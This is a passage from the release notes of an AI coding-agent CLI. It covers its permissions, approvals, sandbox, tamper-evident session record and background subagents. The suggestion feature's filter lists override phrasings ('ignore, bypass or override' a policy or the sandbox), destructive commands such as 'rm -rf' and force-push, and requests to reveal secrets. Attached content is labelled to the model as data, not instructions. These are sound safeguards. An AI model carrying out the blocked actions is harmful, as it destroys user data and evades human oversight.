    workspace; a relative path is taken from the workspace, and a path
    outside it asks first. An export is refused for a record that fails
    verification.
14. **An edit or write without a prior read is refused before the approval
    prompt**, with the reason.
15. **Server API: a request body over the size cap gets 413**, not 400, with
    the cap in the error. A client that treated any 400 as a bad body should
    handle 413 too.
16. **`abhed hawkeye` exits 3 when a session from the local record, or a
    `.jsonl` export of it, fails verification**, as it already did for a
    record with a gap. A failing export exited 0 before; a local-record
    session could not be read at all.
17. **A managed `permissions` setting locks added allow rules.** When the
    managed file sets any `permissions` key (mode, deny, ask or allow),
    `-allow`, `-allowedTools`, `/permissions allow`, the SDK's
    `Options.Allow` (`sdk.New` returns a `*config.ManagedError`) and rpc's
    `start` with allow rules are refused. In 1.2.2, `-allow`,
    `Options.Allow` and rpc `start` were refused only when the file set
    `permissions.allow`; `-allowedTools` and `/permissions allow` are new in
    1.2.3. Allow rules in `~/.abhed/config.json` and a workspace's
    `.abhed/config.json` are also dropped, each with a warning naming the
    rule and its file; the built-in allow rules stay. Put the rules in the
    managed file's `permissions.allow` instead. A call those rules approved
    now asks, and in `-p`, rpc and scheduled runs, with no one to ask, it is
    refused. When any file rule is dropped, all the built-in allow rules come
    back, even ones the file had left out; an ask or deny rule, not a shorter
    allow list, keeps a built-in rule from applying. A person's "Yes, and don't
    ask again" answer to a prompt is not a rule and still applies for the
    session.
18. **On macOS, commands in an ACP editor's workspace (Abhed Studio) cannot
    create any `.git`, `.vscode` or `.devcontainer`**, so `git init` and
    `git clone` inside the workspace fail. Run them in a terminal outside
    the editor, or clone outside the workspace and open that folder.
19. **MCP tools are registered only with plain names**: letters, digits, `_`,
    `.` and `-`, at most 64 characters. A server tool named otherwise is left
    out, with a warning on standard error naming the server and the tool.
    MCP allows longer names; a tool named past 64 characters is left out.

Also:

- The line terminal's destructive-command confirmation is numbered, where it
  asked `Run it? [y/N]`: `1` No, `2` Yes, run it, then Enter. Enter, a letter
  or a paste asks again, and keys in the first 300 ms after it appears are
  ignored. A client of the terminal endpoint must send `confirmed` for a line
  it was asked about at least 300 ms before; an earlier or unasked
  confirmation is asked again.
- `/undo` records each file it puts back as `file.restored`, and is held to
  deny rules on `write`.
- On macOS the local record syncs with `fsync`, as SQLite does by default,
  not the drive-cache flush Go's `File.Sync` asks for there. After a power
  cut, a session's head can then have survived while lines the drive had
  cached did not: the session reports lines missing and is not written to
  again. `abhed -r <session>` goes on from it, after a yes, in a new session
  that names it; the original stays as it is, or `abhed record prune`
  removes it with a tombstone. If the index's head is lost the same way, no
  new session starts until the index is looked at: `abhed record verify`
  names the line; moving `index.jsonl` and `index.head` aside keeps them as
  evidence and starts a new index, and a session file from the old one goes
  on with `abhed -r <file>`, copied into a new session.

### Fixed

- The interactive CLI could turn the first Enter into a new line instead of
  sending the task. A terminal answering a start-up question late, as it can
  on a loaded machine or a slow link, sent its answer straight after the
  Enter, which read as more pasted text. Only text following an Enter now
  makes it a new line. A task typed before the prompt appeared, Enter
  included, is now sent too: the Enter used to arrive through the cooked
  terminal as Ctrl-J, which only started a new line.
- After a command such as `/model`, the interactive CLI's footer could keep
  showing the old model until the next key: it was redrawn before the
  command's own events were drawn. It now waits a moment for them first.
- With piped input, an approval's answer sent as soon as `answer 1-N:`
  showed could be taken as steering for the run, since the approver had not
  yet started waiting. It now waits from the moment that line shows; a line
  sent before the question was asked still steers.
- In the workbench shell and Studio's interactive terminal, a command typed
  at the prompt could be recorded without its text: the shell's echo could
  come back before Abhed began following the line, so the echo was missed.
  The line is now followed before the shell is handed it.
- An event stream that opened while its session was recording could miss
  the event recorded between reading the backlog and subscribing, until the
  next event arrived; a quiet session never showed it. The stream now
  subscribes first.
- A single-role server applying its schema at start, or `abhed migrate`,
  could deadlock with a live node on the same database (1.2.2 and earlier):
  the schema altered sessions before events, while an append takes them the
  other way round. Postgres then failed one side, losing the event or the
  start. Applying the schema now takes each table it alters without waiting
  and tries again while one is busy, one server at a time, so it neither
  deadlocks with appends, orphan claims or the statistics query, nor holds
  up appends behind it.
- Found before release: a wake run could act for a user whose access had
  been revoked. A woken run now asks for its owner again before each model
  call and before each call is approved, and ends as `owner_inactive` once
  the owner has lost access; no next-prompt suggestion is made for them
  either. `StopOwnerBackground` lets an edition stop a revoked owner's live
  run, background shells, tasks and terminals at once, recorded as
  `owner_revoked`. A session whose owner is restored makes no wake or
  suggestion until a background result is next delivered while it is idle,
  or the session is deleted or the server restarts.
- `abhed hawkeye` on a `-p -output-format stream-json` capture reported the
  gaps stream-json leaves where `agent.delta` was as missing events, critical,
  and exited 3. The result line now names what it left out (`omitted`), and
  a gap where only those could sit is reported as "agent.delta omitted by
  stream-json". Any other gap is still critical, and a capture that may have
  left deltas out without saying so is reported as one HawkEYE cannot tell.
- In `/ide`'s line terminal, a key typed behind a destructive line was kept
  after the line was confirmed and glued onto the next one, so `y` then `ls`
  ran `yls`. Confirming now drops what was typed behind the line and the
  lines queued after it, as declining does.
- On a server with Postgres, a workbench hold on a session the server had
  started was released two minutes after the first manual write, not the
  last, so a repeated `session.ended` landed in the middle of terminal or
  review work. Every manual write now extends the hold.
- With more than 40 MCP tools, models never found them: `tool_search` named
  no server and no tool. Its description now lists the servers and their
  tool names (names only, plain characters, about 2.5 KB at most, the rest
  counted), and the system prompt says to use it when tools are deferred.
- With MCP tools deferred, a live-data question went past a listed tool:
  the prompt's web line sent it to `web_search`, and with no web tool its
  no-web line said to answer from memory, so a deferred weather tool was
  rarely reached, and never with the web off. The prompt now puts the
  connected-services line first and tells the model to call `tool_search`
  for live or current data, or whenever a listed tool could fit, before its
  own knowledge, the web or the files; its web, no-web and current-fact
  lines defer to that. Without deferred tools the prompt is unchanged.
- `tasks` ran a task naming an unknown `agent_type` as the general role; it
  now refuses the call before anything runs, as `task` does.
- A `task` call's `max_turns` could exceed `limits.max_turns`; a subagent's
  cap is now never above its parent's.
- The parent loop's own asks now share the one-at-a-time queue its
  subagents use, so a person is never asked two things at once by the tree.
- On the server, an approval that ended always set the session to
  `running`, even when no run was live; it now restores `running`, `idle` or
  `done` as fits. A message sent while an ask was pending and no run was
  live was queued as steering into a loop that was not running; it now
  starts a run.
- A server process that died mid-run left its session's row open, and no
  node could ever continue it. The next message to such a session now takes
  it over, when its holder's heartbeat has gone stale, and records the ends
  the crashed process never wrote (`recovered`; lost background tasks as
  `lost`). Every process holds its sessions under a liveness identity (its
  node id, or an id of its own when none is set) and heartbeats them,
  workbench holds included; the takeover is one conditional update that
  writes the new holder, so of two processes exactly one wins. The
  heartbeat is fenced: it renews only a claim that is still this process's,
  and a process that finds its claim taken, or cannot renew it for the
  stale window, stops its run and tasks as `lease_lost` and writes nothing
  more to the session. On Postgres each append is also fenced in the store,
  in the insert itself, so a process that lost a session cannot add to its
  record even before its next heartbeat. A claim is never taken from
  another live holder. A
  started session's row is written with its holder, and a row with none is
  an orphan only once its last event is two minutes old, on the database's
  clock. A hold that
  cannot be recorded now fails the start, message or wake (503 for a
  message) instead of running unseen. `abhed serve` also sweeps at startup,
  reconciling every open session whose holder's heartbeat is stale.
- Continuing a session elsewhere reset its token and spawn allowance; the
  budget now goes on from what its record says it spent.
- With an event tap set (as telemetry sets one), the server looked for the
  store's durable approvals, session deletion, holders and routing on the
  tap and found none, so they were off. They are now looked for on the store
  under the tap, and switch on behind a tap as without one.
- A server turn continued by a message never refreshed or released this
  node's claim on the session; every run now holds it, with its heartbeat,
  while it or a background task is live.
- With input piped in as lines, the line after an approval prompt was taken
  as its answer whatever it said. Only a number offered answers now; any
  other line steers the run (or, with no run live, is a prompt), with a note
  that the approval still waits.

### Added

- The `-p` result line of `-output-format stream-json` names the event types
  it left out, in `omitted`.
- The terminal lists the conversation's work under the input: `main`, then
  each subagent (foreground and background) and background job, nested under
  what started it, with its type, title, what it is doing now, how long it
  has run and its input tokens; `●` running, `✓` done, `✕` failed, `○`
  cancelled, and `↓ N more` past five. With nothing typed, ↓ and ↑ select a
  row (↑ from `main` is still history; Ctrl-P/Ctrl-N always are), Enter opens
  its record read-only and Esc goes back to `main`. A message typed with a
  running subagent selected goes to it as your message, recorded in its own
  record; one that cannot take messages says so and the message goes to
  `main`. A background subagent or job that ends leaves one line in the
  transcript (`● Agent "…" finished · 5m 27s`, `● Background task "…"
  completed (exit code 0)`). `/tasks` (also `/bashes`) numbers all of it,
  with `/tasks view <n>` and `/tasks kill <n>`. The line mode (`TERM=dumb`,
  piped input) has the notices and `/tasks`, no panel.
- The terminal's note that a background result was delivered now reads
  `result of "…" added to the conversation (completed, 1 turn)`.
- Background shells: `bash` takes `run_in_background`, which starts the
  command and returns at once with a shell id, through the same rules,
  approval, sandbox, secrets and redaction as a foreground command. New tools
  `shell_output` (new output since the last read, the state and exit code,
  optionally waiting) and `shell_kill` (stops its whole process group). Shells
  are listed and stopped with the background tasks on every surface (`kind:
  "shell"`), the agent is told when one ends as it is of a background task's
  result, and each is killed when the session closes, on a stop and when Abhed
  exits. `limits.background_shells` (default 4) bounds them; plan mode refuses
  them; `-p` waits for them. Recorded as `shell.started` and `shell.ended`.
- After a turn completes, the terminal, the workbench, the console and Abhed
  Studio suggest a next prompt: the input shows it dimmed, Tab (or → on the
  empty line in the terminal) puts it in the input, and it is never sent on
  its own. One small model call makes it, from the record's redacted text,
  after the turn has ended: the end, the reply and the prompt never wait for
  it, and the next prompt, a wake, typing or closing the session cancels it.
  It is recorded after the run's `session.ended` (marked `suggesting`) as the
  new `suggestion.offered` event, then the call as a `model.call` with
  `purpose: suggestion`, counted in the session's tokens and budget. The text is cleaned of control and format
  characters and capped at 80 characters. The call asks for low reasoning
  effort and thinking off wherever the provider takes them, and asks once
  more without them if the model refuses. None is offered that tells
  anyone to ignore, bypass or override a policy, an approval, a rule, the
  sandbox or safety, suggests something destructive (delete, `rm -rf`,
  force-push, drop, wipe, disable), or asks to print, show or send a secret: it is model text, which what the agent
  read can shape, and it is never sent unless the person sends it. None is made for `-p`, `rpc`,
  unattended runs, or after an error, a stop or while an approval waits.
  `suggest.enabled` turns it off (a managed `false` binds) and
  `suggest.model` names a cheaper provider; the SDK opts in with
  `Options.Suggest`, and ACP lists `suggestions` in its features.
- The engine side of the Abhed Studio contract
  (docs/architecture/studio-acp-contract.md, `apiLevel` 1). `abhed acp`
  keeps sessions in the local record, so `session/list`, `session/load`
  (a replay that runs nothing again), `session/resume` and `session/close`
  work, with the chain verified first; a record that fails opens read-only,
  to be forked. `initialize` names the engine, its edition and every area it
  serves in `agentCapabilities._meta["zybuu.ai/abhed"]`, and
  `abhed version --json` prints the same block. New `_abhed/*` methods serve
  rename, fork and compact; the event stream; verify, export and HawkEYE;
  modes (`session/set_mode`); the policy view and a dry-run explain; trust
  inspection; background tasks (list, cancel, review of held asks); the
  sandboxed Abhed terminal, line by line or as an interactive shell judged
  and recorded line by line; manual edits; per-hunk review and undo;
  steering and the queue; and the doctor (also `abhed doctor --json`).
  Every action a person takes through them is recorded `by: user`. What is
  not served yet is listed in the contract's §11.
- `available_commands_update` lists the built-in commands, your custom
  commands, a trusted workspace's, and skills; running one is recorded as
  `command.invoked`.
- Permission requests carry the rule that asked, the pipeline step that made
  the call, and for an edit or write the diff it would make, redacted.
- The managed key `studio.disable_host_terminal` removes Abhed Studio's host
  terminal, which is neither sandboxed nor recorded.
- Interactive input acts as the person, through policy and the record. See
  `docs/guide/19-input-and-memory.md`.
  - `@path`, `@path:10-20` and `@dir/` attach files, read by the read and
    glob tools as the person's call: the workspace boundary, links that
    leave it, Abhed's state, read deny rules and redaction all apply. A
    refused mention stops the message and says why. Up to 256 KB per file;
    each is recorded as `input.mention` with its SHA-256.
  - `!cmd` runs a shell command as the person's bash call, in the sandbox and
    under deny rules and plan mode; a destructive one asks. Its output joins
    the next message.
  - `# note` saves a note to `ABHED.md`, `ABHED.local.md` or
    `~/.abhed/ABHED.md`, chosen each time, redacted and recorded as
    `memory.written`.
  - Attached files and command output reach the model in blocks whose tag
    carries a random suffix, labelled as data the person attached, not
    instructions.
  - A line that starts with `!` or `#` is no longer sent to the model as a
    message, in piped input too: a script that sent such lines as text should
    indent them or put them after other text.
- Memory: `ABHED.md` files load in the order user, project (`AGENTS.md`
  where a directory has no `ABHED.md`, labelled so), local, rules, auto and
  managed last. `@path` imports follow `memory.import_depth` (default 5, at
  most 10) and stay in the workspace. `rules.dirs` names rule files, which a
  `paths` header scopes. Each conversation records `memory.loaded` with every
  file's hash. Surfaces with no read rules to ask (the server, the SDK, eval)
  follow no import. `/memory` lists, shows and adds; `/import <path>` appends a
  file the person names to `ABHED.md` after showing it. No other tool's files
  are read otherwise.
- Auto memory, off unless the person turns it on (`/memory auto on` or
  `memory.auto`; a managed value binds, a workspace may only turn it off).
  The agent's `memory_write` saves are judged as changes (they ask unless
  a rule or the mode allows them), redacted, shown, recorded as
  `memory.written` by the agent, and loaded later, fenced, as the agent's
  notes.
- Custom slash commands from `/etc/abhed/commands`, `~/.abhed/commands` and
  `commands.dirs`, and from a workspace's `.abhed/commands`, or any
  commands directory inside the workspace, once the person trusts exactly
  that content (`/commands trust`). `$ARGUMENTS`, `$1`..`$9`,
  `@` files and inline shell lines (each asks) in the body;
  `allowed-tools` narrows the turn's tools and `model` picks a configured
  provider. Built-in names always win. Recorded as `command.invoked`.
- `/init` has the agent write `ABHED.md` from the repository; `/context`
  breaks the context window down by system prompt, memory, tools, MCP tools
  and messages; `/compact <focus>` tells the summary what to keep.
- `ask_user`: in an interactive session the agent can ask the person a
  multiple-choice question. It is not an approval and is never answered for
  the person.
- `/output-style` appends a style from `~/.abhed/styles` or
  `/etc/abhed/styles` to the prompt for the rest of the session.
- CLI governance: every change of permission mode goes through one
  controller and is recorded as `mode.changed`, with how it was made (`flag`,
  `slash`, `shift-tab`, `plan-exit`). The Shift-Tab cycle is default,
  accept-edits and plan, and never reaches auto or bypass; a managed
  `cli.mode_cycle` can only take modes out of it. `/mode auto` asks first,
  with no as the default, and is refused over a managed mode. `/mode` alone
  says what auto approves, by rule, and what still asks.
- Plan mode ends in a plan the person decides on. The agent presents it with
  the new `exit_plan` tool, offered only in plan mode, which records
  `plan.proposed` and changes nothing. The CLI asks: yes and accept edits,
  yes and ask before each change, or keep planning, the default. Auto and
  bypass are never offered. The answer is recorded as `plan.decided`, and an
  accepted plan moves the mode, recorded as `mode.changed` via `plan-exit`.
- `/permissions` lists the rules in force with the layer each came from
  (managed, user, workspace, flag, default, session). `/permissions
  allow|ask|deny <rule>` adds a rule for this session only, recorded as
  `permission.changed`; `/clear` and `/resume` end it. A session allow is
  asked about, twice when it approves every call to a tool, is refused where
  the managed configuration sets the permissions, and is evaluated after the
  configured allow rules, so it cannot lift a deny rule, a destructive
  command, an ask rule or plan mode. `/permissions explain <tool> <what>` is a
  dry run that names the decision, step, rule and reason.
- `/add-dir <dir>` adds a directory for the session, read-only or read-write,
  after showing it with its links resolved. It is bound by a managed
  `additional_dirs` as `-add-dir` is, refuses Abhed's state, the record,
  credential folders and any folder holding the home directory, and is
  recorded as `workspace.dir_added`.
- Hooks: extensions can take `user_prompt_submit` and `permission_request`,
  which may block and never approve, and `turn_end`, `subagent_end` and
  `notification`, which only observe, in the interactive CLI. `match` narrows
  `tool_call` and `permission_request` to calls a permission rule matches, as
  a deny rule would match them, and `async` sends
  observe-only events without waiting. A subagent's calls go through the
  parent's `permission_request` hooks. A `user_prompt_submit` hook that has
  stopped fails open, and the CLI says so. Each hook that blocks, forces an ask
  or annotates is recorded as `hook.fired`. `/hooks` lists the extensions
  with their layer, events, matcher and status. A managed `hooks.disabled`
  now takes effect: extensions keep only the tools they provide.
- `policy.Result` names the rule that decided (`Rule`), and `action.approved`
  and `action.denied` record it as `rule` when a deny, ask or allow rule
  decided.
- A durable, tamper-evident local record, shared by the command line and
  the SDK (`store/local`). See `docs/guide/12-records.md`.
  - One append-only file per session. Each line is canonical JSON with
    `prev` and `hash` (SHA-256). `abhed record verify` fails, naming the
    event, on an edited, removed, moved or repeated line, on lines the head
    counts cut from the end, on a head or index that no longer matches, and
    on a listed session whose file is gone.
  - It cannot show lines written after the last sync being cut, and it is
    only as strong as the head and index files, which the same owner can
    rewrite. It is evident against the agent and against accidental or
    partial edits, and verifiable offline. It is not proof against the
    machine's owner.
  - A record that fails is never written to again; reading, verifying,
    exporting or opening it changes nothing, and going on from it is a
    recorded fork into a new session.
  - Secrets are redacted before the first write. Directories are `0700` and
    files `0600`. The agent's file tools and sandbox tiers refuse the
    record: `~/.abhed/records`, a managed `record.dir`, a linked records
    directory's real path, and an SDK agent's record.
  - One process writes a session at a time, by a lock the system drops
    when the process exits; the record belongs on a local disk. A crash's
    unfinished last line is cut off, only past what the head counts, and
    recorded as `record.repaired`.
- `abhed record list|show|verify|export|prune`. A `.jsonl` export carries
  the stored head and whether the record verified; a failing record exports
  only with `-unverified`, marked. An export never writes through a link or
  into the record. `prune` asks first and leaves a tombstone saying what it
  found.
- `-c`/`--continue`, `-r`/`--resume [id|name|file]` (a picker with no
  argument), `-n`/`--name` and `--fork-session`, also with `-p`. Resuming a
  record that fails verification shows it unverified, and with a yes goes on
  in a new session that names it.
- `/rewind` takes code, the conversation or both back to before a prompt.
  The conversation side is a recorded `conversation.forked`, never a
  deletion, and rewinding to the first prompt is a fork at step 0 in the
  same session. Each file put back is recorded as the person's action, put
  to policy, then as `file.restored` with hashes before and after, and
  keeps its mode.
- Checkpoints before each agent edit are kept in the record's blobs, so
  `/undo` and `/rewind` work after `abhed -c`. Files a read deny rule covers
  or that hold keys are not copied.
- `/rename`, `/branch` and `/clear [name]`. A branch opens with
  `session.branched` and a copy of the conversation and its undo history;
  the original is left as it was.
- HawkEYE's sensitive-path finding and the checkpoint skip share one list of
  key and credential file names, matched without case against each part of
  a path in the call, where HawkEYE used to match fixed substrings; it now
  also names `.envrc`, `*.env`, `.git-credentials`, `.pgpass`, `*.tfvars`,
  `.azure/` and more, and no longer matches a name only inside a longer word.
- SDK: `Options.Store` and `OpenLocalRecord`, so an embedded agent can keep
  the local record. Its directory becomes state for that agent, and `New`
  refuses one inside the workspace or any other folder the agent's commands
  can write.
- `record.dir` and `record.retention_days` are in effect, from the managed
  configuration only.
- `/agents`, `/skills`, `/mcp` and `/tools` show what the session has and
  where each came from; `/mcp restart <server>` reconnects one. `/doctor`
  runs the doctor's checks inside a session, `/release-notes` shows the
  changelog built into the binary, and `/bug` prints a prefilled issue link
  with secrets and the home directory redacted, sending nothing.
- With more than 40 MCP tools, they are offered through a `tool_search`
  tool and loaded when found, so a large server does not fill the context.
  Every call is still policed and recorded.
- `docs/guide/18-cli.md`: the command line, its flags and commands.
- `statusline.command` runs a command of yours for the status line. It reads
  the session's status as JSON on stdin (model, provider, mode, context,
  tokens, sandbox, record, branch, background tasks) and its first line is
  shown in the footer on a terminal, after each task in piped sessions,
  and in `/status`. It runs under the process
  sandbox with the network off, whatever the session allows, for at most
  300 ms, and not at all where that sandbox is missing. A script it names
  by path is pinned at the start of the session, refused where the agent
  could change it or in Abhed's state, and not run once swapped. Only text and
  colour of its output reach the terminal. A workspace's statusline needs
  trust.
- `/model` with no name offers the configured models with their model id,
  context window and whether they are local; a managed `model.default` is
  not switched. `/effort low|medium|high|on|off|default` sets the reasoning
  effort, or thinking on and off, where the provider supports it.
- A fallback model: `model.fallback` and `-fallback-model` name configured
  providers to move to, in order, when the model is unreachable or refuses
  access (401, 403, 404, 429, 5xx). The move is recorded as
  `model.fallback`. Only offered providers are used, and a managed
  `model.default` is left only for the fallbacks the managed configuration
  names; `-fallback-model` is then ignored with a warning.
- `/status`: model, mode, sandbox, record, session, context, turn limit and
  its semantics, token budget, background tasks, workspace trust, and the
  managed settings. `/usage` (and `/cost`) adds prefill saving and a
  breakdown by subagent and tool source.
- `/config` shows each setting and where it comes from; `/config set` writes
  a setting into your own `~/.abhed/config.json`. A change that lets the
  agent do more than your own file does asks first, even when the session
  already does it, and a managed setting is refused.
- The interactive CLI is rebuilt around an input box that stays on screen
  while the agent works ([The terminal](docs/guide/20-terminal.md)):
  - Replies stream as they are written, formatted as they arrive: headings,
    lists, emphasis, tables, and highlighted code blocks that stay blocks
    when they arrive in pieces. Prose wraps between words.
  - Multi-line messages (Shift+Enter, Alt+Enter, Ctrl-J, `\` then Enter);
    a large paste is one placeholder and one message; history is kept per
    workspace, with Ctrl-R search; shell editing keys, undo, `$EDITOR` with
    Ctrl-G, and optional vim editing (`/vim`).
  - Accented letters, CJK, emoji and flags are typed, measured and deleted
    as the characters they are.
  - Tool calls show the first and last lines of their output, and edits and
    writes a diff with line numbers and context, in every mode; Ctrl-O shows
    the whole transcript with everything in full. Paths are relative to the
    workspace.
  - Approvals are a numbered dialog that shows the change, why it is asked,
    the policy step, and who asked; it stays in the transcript with the
    answer.
  - A footer shows the permission mode, the model, how full the context
    is, the session's tokens, background tasks and the git branch;
    `statusline.command` replaces its second row with a command's output.
  - Shift-Tab steps through default, accept-edits and plan, never auto or
    bypass.
  - Dark, light, high-contrast and colour-blind themes, chosen from the
    terminal's background or with `/theme`.
  - The Surface the slash commands draw and ask through is the terminal:
    blocks, guarded dialogs, pickers and full-screen panels.
- Configuration keys for the interactive CLI, all in effect (above):
  `statusline.command`, `cli.mode_cycle`, `commands.dirs`, `rules.dirs`,
  `memory.auto`, `memory.import_depth`, `record.dir`,
  `record.retention_days` and `hooks.disabled`. `cli.mode_cycle`,
  `record.*` and `hooks.disabled` are managed only: the user's file or a
  workspace's is set aside with a warning. A workspace may only turn
  `memory.auto` off, trusted or not, and auto memory is off unless turned
  on. `commands.dirs`, `rules.dirs` and `statusline` in a workspace need
  trust.
- A first run on a terminal with no configuration offers to set one up: a
  local Ollama model, or an OpenAI-compatible endpoint by URL and the name
  of the variable holding its key (an answer that looks like a key is
  refused, and a variable that is not set is taken only on a yes). It checks the
  model can call a tool, asks once about auto memory (No by default), and
  writes only `~/.abhed/config.json`, after confirming.
- Headless runs read stdin. `cat build.log | abhed -p "why did this fail?"`
  sends the log below the task; with no task, stdin is the task. Flags may
  follow the task, and `-p` alone takes the task from stdin. In a loop that
  reads a list on stdin, redirect each run from `/dev/null`, or pass
  `-no-stdin`, so the first run does not take the rest of the list.
- A task on the command line opens an interactive session with it:
  `abhed "fix the tests"` or `abhed -- fix the tests`. A single bare word
  that is not a command is still refused, now with a hint.
- `-output-format stream-json`: one event per line, without the streamed
  fragments unless `-include-partial-messages` is given. `json` and
  `stream-json` end with a result line: the final reply, the terminal
  reason, the exit code, turns, duration and token usage.
- `-input-format stream-json` reads user messages from stdin, one per line,
  as the turns of one conversation.
- `-json-schema` (inline or `@file`) delivers a `-p` answer as JSON that
  matches the schema.
- `-max-budget-tokens`, `-append-system-prompt[-file]`,
  `-system-prompt[-file]` and `-verbose`. Replacing the system prompt is
  refused under a managed configuration; a new `session.started` event
  records which was used, by SHA-256.
- Familiar flag spellings: `-permission-mode`, `-allowedTools`,
  `-disallowedTools` and `-dangerously-skip-permissions`. They bind as
  Abhed's own flags do; the last asks for `yes` on a terminal, is refused
  under a managed configuration and without a terminal, and deny rules
  still apply in the mode it sets.
- `abhed acp`: an editor can list the configured models and switch between
  them mid-session. `session/new` returns a `configOptions` model selector
  (category `model`), and `session/set_config_option` switches it, answering
  with the full options. Editors on the older
  unstable API get `models` in `session/new` and `session/set_model`. Each
  choice is a configured provider's name, described by its model id and
  type, never its endpoint or key. Only providers a trusted configuration
  defines are offered, and a managed `model.default` pins the model. A
  switch is refused while a prompt runs, for an unknown name, and for a
  provider whose `api_key_env` is unset, naming the variable. It is recorded
  as `model.switched`.
- SDK: `Agent.Models` and `Agent.SwitchModelNamed` list and choose the
  configured models by name, with `ErrUnknownModel` and `ErrSwitchDuringRun`.
- Background subagents. `task` and `tasks` take `background: true`: the
  call returns at once, the task outlives the run, and its result comes back
  as a `subagent.notice` (recorded first, untrusted, redacted), delivered as
  a `task_status` call and result, never as the person's message.
  `subagents.wake` (`off`, `notify`, `auto`) says what a result does while
  the session is idle; `auto` runs a short wake run (`session.woken`,
  `wake_limit`) within `subagents.max_wakes_per_hour` and
  `subagents.wake_max_turns`. It is `auto` by default in the interactive
  CLI, `abhed serve` and `abhed acp` (see Changed); `abhed rpc` and the SDK
  default to `off`, and `-p`, eval and unattended runs join their tasks.
  `notify` keeps 1.2.2's behaviour: the result is recorded and waits for
  your next message. New limits
  `limits.max_background_subagents` (4) and `limits.background_max_minutes`
  (60, at most 480). New tools `task_status` and `task_cancel`. An explicit
  stop cancels every background task, stops a `task` or `tasks` call still
  starting its tasks, and holds wakes until the next prompted run; "send
  now" keeps them. A `tasks` call starts all its background tasks or none.
  A fork is refused while background tasks run.
- Resuming a finished subagent: `task` takes `resume`, a task id of this
  session's, and continues that subagent's own conversation with a new
  prompt, on the model it ran on, in its worktree, under its role as it is
  now. It never falls back to the main tree, and a managed role's current
  model pin binds it. A managed `model.default` pins every subagent's model.
- Server: the session state `background`; `GET /v1/sessions/{id}/tasks`,
  `POST /v1/sessions/{id}/tasks/{task}/cancel` and `POST
  /v1/sessions/{id}/wake`, owner only; the session list's `background` and
  `pending_ask`; `Options.OwnerActive`. The console and workbench draw
  background results, wakes and the closing end, and list background counts
  and waiting approvals. `session.ended` gains `background` (what is still owed:
  tasks running, results not yet delivered, a wake starting), `settled`
  and `recovered`; in Postgres a session with background tasks running keeps its
  row open until the closing end, and a store may implement `ClaimOrphan`.
- CLI: results drawn at the prompt, `/tasks`, `/wake`; Ctrl-C twice at the
  prompt cancels background tasks. rpc: `start.wake`, `tasks`,
  `cancel_task`, `wake`. SDK: `Options.Background`, `Background`,
  `CancelTask`, `CancelTasks`, `WaitBackground`, `Wake`,
  `ErrNothingToWake`. ACP: a card per background task; an ask made between
  prompt turns waits for the next one.
- Agent definitions: markdown files whose frontmatter names a subagent role
  (`name`, `description`, `tools`, `disallowed_tools`, `model`, `max_turns`,
  `isolation`, `permission_mode`) and whose body is its instructions. They
  load from the managed `/etc/abhed/agents`, then a workspace's
  `.abhed/agents` when the workspace is trusted for that content, then
  `agents.dirs` (default `~/.abhed/agents`); a higher level wins a name and
  the shadowed file is named. `task` and `tasks` offer them beside the
  built-in roles, on every surface (the SDK with `ConfiguredTools`; `eval`
  keeps the built-in roles). See the new guide, Agent definitions.
- Every key only narrows: a tool the session lacks refuses the spawn and is
  named, `permission_mode` (`plan` or `default`) applies only where it
  narrows, `max_turns` caps the role and binds the call, a `worktree` role
  gets its own checkout. The built-in names are reserved. A key concerning
  authority that Abhed does not honour (`hooks`, `mcpServers`,
  `permissions`, allow or deny keys, sandbox settings), a wider mode, or a
  model that is not a configured provider refuses the definition.
- A subagent may run on another configured provider: `model` on the `task`
  and `tasks` calls, or in a definition. It is a provider name, never an
  endpoint; on a server only a provider sessions may run on. A model that
  cannot be had refuses the call, with no fallback and no spawn counted. The
  `model` property is offered only when more than one provider is.
- Configuration keys `agents.dirs` (never from an untrusted workspace file)
  and `agents.disabled` (an untrusted file may set it only to true).
- `POST /v1/admin/agents/reload` reads the definitions again for sessions
  started afterwards; a running session keeps the set it started with.
- `subagent.spawned` records `definition`, `definition_source`,
  `definition_sha256`, `tools`, `model` and `provider`; `subagent.returned`
  records `model` and `provider`.
- `abhed trust grant -agents-sha256 H`. The trust report (ACP, rpc, SDK)
  gains `agents`, `agents_sha256`, `agents_trusted`, `agents_reason` and
  `agents_problems`; the config package adds `GrantReviewed`,
  `RecordDecision` and `RefreshAgents`.

### Changed

- In `/ide`'s terminal, answers typed into a running command are now taken
  out of the recorded output, not only passwords: each output line sharing
  four characters with an answer is recorded as `[withheld]`, and an answer
  edited as it was typed withholds the whole output. The person still sees
  everything live.
- In the terminal, Esc and Ctrl-C now say what they left: Esc ends the turn
  and keeps background shells and tasks ("Interrupted · background shells
  kept"), Ctrl-C stops them too ("… stopped"). Both still end as
  `user_interrupt`; `session.ended` gains `detail` to tell them apart.
- A background task that finishes while the session is idle now wakes the
  agent: `subagents.wake` defaults to `auto` (it was `notify`), so the agent
  continues with the result on its own instead of waiting for your next
  message. The usual limits hold: `subagents.max_wakes_per_hour`,
  `subagents.wake_max_turns`, a stop holds wakes until your next message
  (stopping one task with `/tasks kill` or a task's stop included),
  asks still come to you, and only the session's own tasks wake it. Set
  `"wake": "notify"` for the old behaviour; the managed configuration can
  hold it there. The console and workbench draw the woken turn live, marked
  "continuing with results from <task>", with its asks offered, and the
  workbench lists running background tasks in its status bar.
- Abhed Studio and other ACP editors wake too: a woken turn streams as
  session updates between `_abhed/wake/started` and `_abhed/wake/ended`, and
  a prompt sent meanwhile waits for it. rpc takes `start.wake: "auto"` and
  answers a woken run with a `woken` line; the SDK takes `Background: "auto"`
  and `HostWake`, and `CancelTasks` ends a wake run in progress. rpc and the
  SDK still default to joining their tasks.

- Approvals and the line mode write a hidden character in one form wherever
  it is shown: `⟨\r⟩`, `⟨\e⟩`, `⟨U+200B⟩`, and a byte that is not UTF-8 as
  `⟨\xff⟩`, where 1.2.2's line prompt wrote `\r` and `\x1b`. A tab is drawn
  as four spaces. A run of blanks eight columns wide or more (32 at the start
  of a line) is still counted, as `⟨32 spaces⟩`, and still raises the
  hidden-character warning. The approval dialog previews `ssh`, `web_fetch`,
  `task` and `k8s_apply` calls as the line prompt does.
- `abhed acp` writes the workspace trust report under
  `_meta["zybuu.ai/abhed"]`; the older `_meta.abhed` key is still read on
  input for one more release. Stop reasons now come from the run's
  terminal reason: `max_budget` is `max_tokens`, an interrupt is
  `cancelled`, and an error is no longer read from its text.
- The interactive CLI's `limits.max_turns` applies to each message, so a long
  conversation no longer runs out for good; a message that reaches it says
  how to go on. A managed `limits.max_turns` still bounds the whole
  conversation. Headless runs and the server are unchanged.
- An edit or write the tool would refuse for want of a read (an existing file
  not read this session, one changed since, an edit of a missing file) is now
